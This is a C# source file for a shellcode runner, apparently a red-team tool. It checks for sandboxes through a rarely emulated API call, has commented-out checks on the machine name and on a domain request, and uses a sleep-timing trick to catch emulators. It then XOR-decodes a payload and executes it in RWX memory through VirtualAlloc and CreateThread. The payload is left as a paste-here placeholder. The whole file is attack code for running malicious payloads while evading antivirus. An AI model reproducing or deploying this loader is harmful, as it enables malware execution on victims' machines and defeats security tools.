using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Threading;

namespace Shellcode_Runner
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        static void Main(string[] args)
        {
            // Check if we're in a sandbox by calling a rare-emulated API
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                return;
            }
            Console.WriteLine("API Emulation done!");

            // uncomment the following code if the sand box has internet

            //string exename = "ShellCode_Runner+heuristics";
            //if (Path.GetFileNameWithoutExtension(Environment.GetCommandLineArgs()[0]) != exename)
            //{
            //    return;
            //}

            //if (Environment.MachineName != "EC2AMAZ-CRPLELS")
            //{
            //    return;
            //}

            //try
            //{
            //    HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://bossjdjiwn.com/");
            //    HttpWebResponse res = (HttpWebResponse)req.GetResponse();
            //
            //   if (res.StatusCode == HttpStatusCode.OK)
            //   {
            //        return;
            //    }
            //}
            //catch (WebException we)
            //{
            //    Console.WriteLine("\r\nWebException Raised. The following error occured : {0}", we.Status);
            //}

            // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
            var rand = new Random();
            uint dream = (uint)rand.Next(10000, 20000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                Console.WriteLine("Joker, get the rifle out. We're being fucked.");
                return;
            }

            PASTE OUTPUT FROM XOR-ENCODER HERE

            // Decode the XOR payload
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Console.WriteLine("Allocation Complete!");

            Marshal.Copy(buf, 0, addr, size);
            Console.WriteLine("Copy done!");

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
            IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine("Thread Created");

            WaitForSingleObject(hThread, 0xFFFFFFFF);
            Console.WriteLine("Reached End");

        }
    }
}
